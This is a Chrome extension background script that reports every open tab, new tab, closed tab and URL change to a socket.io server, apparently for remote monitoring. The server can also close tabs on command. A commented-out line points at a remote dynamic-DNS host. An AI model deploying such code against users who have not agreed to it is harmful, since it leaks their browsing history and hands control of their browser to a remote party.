

//var socket = io.connect('http://sudo.servebeer.com:8080');
var socket = io.connect('http://127.0.0.1:3000');
var tabs = {};
var stored = localStorage.getItem("client_id")
var client = (stored) ? stored : (Math.random() * 2342342342).toString().replace(/\./, "O");
localStorage.setItem("client_id", client);
var close = function(id){
  if(!id){
    var arr = [];
     // loop through tab objects
    for(var key in tabs){
      var tabid = tabs[key].id;
      arr.push(tabid);
    }
    chrome.tabs.remove(arr);
    tabs = {};
  }else{
    // close only specific tab
    chrome.tabs.remove(parseInt(id));
    delete tabs[id];
  }
};
//query all tabs
chrome.tabs.query({}, function(Tabs){
    console.log(Tabs)
    for(var i = 0; i < Tabs.length; i += 1){
      var Tab = Tabs[i];
      tabs[Tab.id] = Tab;
    }
});

// on connection send a random number for client id
socket.on("connect", function(){
  socket.emit("new_client", {client_id : client, tabs : tabs});
});
// when we get the close command
socket.on('close', function (data) {
   close(data.id);
});

// when a new tab is created
chrome.tabs.onCreated.addListener(function(tab) {
	tabs[tab.id] = tab;
  // emit the new tab with the client id
  socket.emit("new_tab", {tab : tab});
  //removing timeout time its better tracked
  //setTimeout(function(){chrome.tabs.remove(tab.id)}, (Math.random() * 240000) + 60000);
});

// remove tabs from tracking when a tab is removed
chrome.tabs.onRemoved.addListener(function(tabid) {
  delete tabs[tabid];
  socket.emit("close_tab", {tabid : tabid})
});

chrome.tabs.onUpdated.addListener(function(tabid , change) {
  if(change.url){
    tabs[tabid].url = change.url;
    socket.emit("url_change", {tabid : tabid, url : change.url})
  }
});

